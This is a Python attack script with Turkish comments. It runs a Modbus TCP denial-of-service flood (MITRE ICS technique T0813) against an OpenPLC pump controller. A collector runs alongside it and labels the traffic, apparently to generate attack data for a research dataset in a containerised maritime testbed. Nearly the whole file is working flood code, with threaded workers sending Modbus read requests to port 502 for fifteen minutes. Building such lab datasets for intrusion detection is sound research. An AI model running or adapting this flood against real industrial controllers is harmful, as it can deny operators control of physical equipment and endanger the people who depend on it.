#!/usr/bin/env python3
"""
T0813 - Denial of Control: Modbus DoS
SGS pump-1 PLC'ye TCP flood - container içinden çalıştırılır
Kullanım: podman exec macyste-openplc-sgs-pump-1-openplc python3 /tmp/attack_t0813_modbus_dos.py
"""
import socket, struct, threading, time, subprocess, sys

DURATION = 900
RECOVERY = 120
TARGET_IP = "10.1.2.3"
TARGET_PORT = 502
OUTPUT = "/root/MaCySTe/grad_rl_data/attack_data.csv"
COLLECTOR = "/root/MaCySTe/macyste_collector.py"

def run_collector(label, duration):
    cmd = ["python3", COLLECTOR, "--label", label,
           "--duration", str(duration), "--output", OUTPUT, "--append"]
    print(f"[COLLECTOR] label={label} duration={duration}s")
    return subprocess.Popen(cmd)

def flood():
    count = 0
    error_count = 0
    stop = threading.Event()
    end_time = time.time() + DURATION

    def worker():
        nonlocal count, error_count
        while not stop.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.1)
                s.connect((TARGET_IP, TARGET_PORT))
                mbap = struct.pack(">HHHBB", 1, 0, 6, 1, 3)
                pdu = struct.pack(">HH", 0, 10)
                s.send(mbap + pdu)
                count += 1
                s.close()
            except Exception:
                error_count += 1

    threads = [threading.Thread(target=worker, daemon=True) for _ in range(5)]
    for t in threads:
        t.start()

    while time.time() < end_time:
        remaining = int(end_time - time.time())
        if remaining % 60 == 0 and remaining > 0:
            print(f"[ATTACK] {count} paket, {error_count} hata, kalan={remaining}s")
        time.sleep(1)

    stop.set()
    for t in threads:
        t.join(timeout=2)
    print(f"[ATTACK] Bitti: {count} paket, {error_count} hata")

print("[T0813] Modbus DoS basliyor...")
collector = run_collector("t0813_modbus_dos", DURATION)
flood()
collector.wait()
print(f"[RECOVERY] {RECOVERY}s...")
run_collector("recovery", RECOVERY).wait()
print("[DONE]")
